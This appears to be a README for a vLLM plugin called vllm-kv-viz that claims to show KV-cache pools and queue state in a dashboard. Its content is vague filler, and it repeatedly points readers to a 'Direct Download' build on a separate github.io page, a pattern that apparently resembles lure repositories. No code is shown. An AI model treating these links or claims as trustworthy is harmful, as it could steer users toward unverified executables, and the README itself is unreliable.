# vllm-kv-viz v2026 - vLLM plugin 2026

> **vllm-kv-viz is a vLLM OpenAI server plugin for visualizing KV-cache pools and queue activity, with dashboard views, token-protected access, and adaptive support for multiple cache schemes in 2026.**

[![Platform](https://img.shields.io/badge/Platform-vLLM%20OpenAI%20server-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/will-hughes50/vllm-kv-viz-v2026?style=flat-square)](https://github.com/will-hughes50/vllm-kv-viz-v2026)

---

<p align="center">
  <a href="https://will-hughes50.github.io/vllm-kv-viz-v2026/">
    <img src="https://img.shields.io/badge/Download-vllm--kv--viz%20Latest-brightgreen?style=for-the-badge" alt="Download vllm-kv-viz">
  </a>
</p>

> **[Direct Download - vllm-kv-viz v2026](https://will-hughes50.github.io/vllm-kv-viz-v2026/)**

---

[Download Latest Build](https://will-hughes50.github.io/vllm-kv-viz-v2026/)

---

## What vllm-kv-viz does

vllm-kv-viz brings a dashboard-driven view to a vLLM deployment, letting you observe KV-cache pool behavior and idle queue status without relying only on logs or raw metrics. It is intended to sit alongside the vLLM OpenAI server and make cache and queue movement easier to understand while the server is running.

The plugin is designed to remain loosely tied to the cache backend. In practice, that makes one visualization layer usable across several cache layouts, including three-zone configurations, two-zone configurations, and the native vLLM queue fallback path.

---

## Key capabilities

- Visual inspection of KV-cache pools during runtime
- Queue-state viewing for free queue awareness
- Automatic handling across multiple cache schemes
- Delta-based refreshes for incremental dashboard updates
- Sparkline time series for compact trend tracking
- Token-protected access for controlled entry
- PD role badge detection for role-aware display
- Support for multiple instances in one dashboard view

---

## Installation

Clone the repository and place it in your vLLM plugin or extension path, then make sure the HTML-based assets are available to the server that hosts the dashboard.

1. Download or clone the repo:
   - `git clone https://github.com/will-hughes50/vllm-kv-viz-v2026.git
2. Add the plugin to your vLLM OpenAI server setup according to your deployment layout.
3. Start or restart the server so the visualization endpoints and dashboard assets are loaded.

If you are using the release page, download the latest build and deploy it to the same location your vLLM service uses for plugins or static assets.

---

## How to use it

Once the plugin is active, open the dashboard from your vLLM environment and review the live cache pool, queue state, and instance-specific indicators.

Typical workflow:
1. Launch the vLLM OpenAI server with the plugin enabled.
2. Open the dashboard URL exposed by your deployment.
3. Review KV-cache activity, queue movement, and sparkline trends.
4. Use delta updates to follow changes without reloading the full view.
5. If access control is enabled, provide the token expected by your deployment.

For multi-instance deployments, the dashboard can be used to compare separate instances side by side.

---

## Configuration

Configuration depends on how your vLLM server exposes the plugin and dashboard assets. In most deployments, settings are provided through the server startup arguments, environment variables, or the plugin integration layer.

A typical setup may include values for:
- dashboard access token
- instance identifiers
- cache-scheme selection or detection
- server route or mount path

Keep configuration near your vLLM deployment files so the dashboard stays aligned with the active server instance.

---

## Requirements

- vLLM OpenAI server
- A supported vLLM plugin integration path
- HTML-capable dashboard hosting for the visualization layer
- Network access to the server endpoints used by the dashboard
- Storage for plugin files and static assets

---

## FAQ

### Does this work with different cache schemes?
Yes. The plugin is built to adapt to multiple cache arrangements, including three-zone, two-zone, and native queue fallback behavior.

### How do I update it?
Replace the existing plugin files with the latest release build, then restart the vLLM server or refresh the deployment as required by your environment.

### Where are settings stored?
That depends on your deployment. In most cases, settings live in the server startup configuration, environment variables, or the plugin mount location.

### What if the dashboard is not loading?
Check that the vLLM OpenAI server is running, the plugin files are deployed in the correct location, and any token or route settings match your environment.

### Can I use it with more than one instance?
Yes. The dashboard includes multi-instance support so you can monitor multiple running instances from the same visualization layer.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
